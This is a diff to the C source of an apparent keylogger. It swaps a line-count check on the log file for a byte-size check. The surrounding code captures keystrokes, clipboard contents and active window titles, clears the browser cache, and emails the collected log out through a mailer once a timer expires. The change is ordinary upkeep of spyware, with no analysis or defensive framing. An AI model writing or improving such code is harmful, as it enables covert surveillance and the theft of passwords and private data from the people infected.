@@ -20,7 +20,7 @@ void ClearBrowserCache();
 void InitLogfile(char* logfile_path);
 
 // logging
-int GetLogfileLength(char* logfile_path);
+long int GetLogfileSize(char* logfile_path);
 void UpdateCurrentWindow(char* window, char* new_window, char* prev_clipboard, FILE* logfile);
 void UpdateClipboard(char* prev_clipboard, FILE* logfile);
 void KeystrokeHandler(short key, FILE* logfile);
@@ -80,8 +80,8 @@ int main(){
         // no keystrokes lets email_timer time out
         if(email_timer > LOG_TIMER){
             
-            // don't send empty files (5 lines is length of header)
-            if(GetLogfileLength(logfile_path) > 5){
+            // don't send empty files (153 bytes is length of header)
+            if(GetLogfileSize(logfile_path) > 153){
                 ExecuteMailer(mailer_path, directory); // email
                 InitLogfile(logfile_path);             // clear logfile
             }
@@ -251,16 +251,16 @@ void InitLogfile(char* logfile_path){
     fclose(logfile);
 }
 
-// gets the length of the logfile
-int GetLogfileLength(char* logfile_path){
-    int lines = 0;
+// gets the size in bytes of logfile
+long int GetLogfileSize(char* logfile_path){
     FILE* logfile = fopen(logfile_path, "r");
-    while(!feof(logfile)){
-        if(fgetc(logfile) == '\n'){ 
-            lines++; 
-        }
-    }
-    return lines;
+    
+    // seek till eof and get offset of fp
+    fseek(logfile, 0L, SEEK_END);
+    long int size = ftell(logfile);
+    
+    fclose(logfile);
+    return size;
 }
 
 // update current working window of the user
